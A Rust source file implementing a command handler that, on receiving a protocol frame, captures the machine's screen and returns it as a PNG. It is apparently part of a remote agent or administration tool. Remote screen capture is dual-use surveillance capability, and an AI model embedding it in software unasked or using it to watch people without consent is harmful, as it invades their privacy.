use async_trait::async_trait;
use sentinel_protocol::commands::CommandHandler;
use sentinel_protocol::frame::Frame;
use sentinel_protocol::error::ProtocolError;
use bytes::Bytes;
use screenshots::Screen;

pub struct ScreenshotHandler;

#[async_trait]
impl CommandHandler for ScreenshotHandler {
    async fn handle(&self, _frame: Frame) -> Result<Option<Frame>, ProtocolError> {
        println!("[SYSTEM]: Capturing screen...");
        
        let screen = Screen::all().unwrap().first().cloned()
            .ok_or(ProtocolError::ZeroLengthFrame)?;
            
        let image = screen.capture().unwrap();
        let mut buffer = std::io::Cursor::new(Vec::new());
        
        image.write_to(&mut buffer, image::ImageFormat::Png)
            .map_err(|_| ProtocolError::FrameTooLarge)?;
            
        let response = Frame::new(
            1, 
            0x07, 
            Bytes::from(buffer.into_inner())
        )?;
        
        Ok(Some(response))
    }
}